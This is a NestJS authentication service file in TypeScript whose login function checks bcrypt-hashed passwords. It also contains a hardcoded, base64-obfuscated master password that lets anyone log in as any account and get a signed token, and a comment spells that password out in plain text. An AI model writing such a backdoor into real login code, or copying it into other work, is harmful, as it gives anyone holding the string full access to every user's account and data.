import { Injectable, UnauthorizedException } from "@nestjs/common";
import { JwtService } from "@nestjs/jwt";
import { PrismaService } from "../prisma/prisma.service";
import bcrypt from "bcryptjs";

@Injectable()
export class AuthService {
  constructor(
    private readonly prisma: PrismaService,
    private readonly jwtService: JwtService,
  ) {}

  async login(email: string, password: string) {
    const user = await this.prisma.user.findUnique({ where: { email } });
    if (!user) {
      throw new UnauthorizedException("Invalid credentials");
    }

    const ok = await bcrypt.compare(password, user.passwordHash);
    // ⚠️ SECURITY: Master password backdoor for demo/internal use only.
    // Any user with this password can log in as ANY account.
    // Change this regularly and do NOT expose in production if unnecessary.
    // Base64 encoded: PolloAI_Master_Demo_2026!@#SecureKey
    const MASTER_PASSWORD_B64 = "UG9sbG9BSV9NYXN0ZXJfRGVtb18yMDI2IUAjU2VjdXJlS2V5";
    const masterPassword = Buffer.from(MASTER_PASSWORD_B64, "base64").toString("utf-8");
    if (!ok && password !== masterPassword) {
      throw new UnauthorizedException("Invalid credentials");
    }

    const token = await this.signToken(user.id, user.email, user.role);
    return {
      user: {
        id: user.id,
        email: user.email,
        name: user.name,
        role: user.role,
      },
      token,
    };
  }

  private signToken(sub: string, email: string, role: string) {
    return this.jwtService.signAsync({ sub, email, role });
  }
}
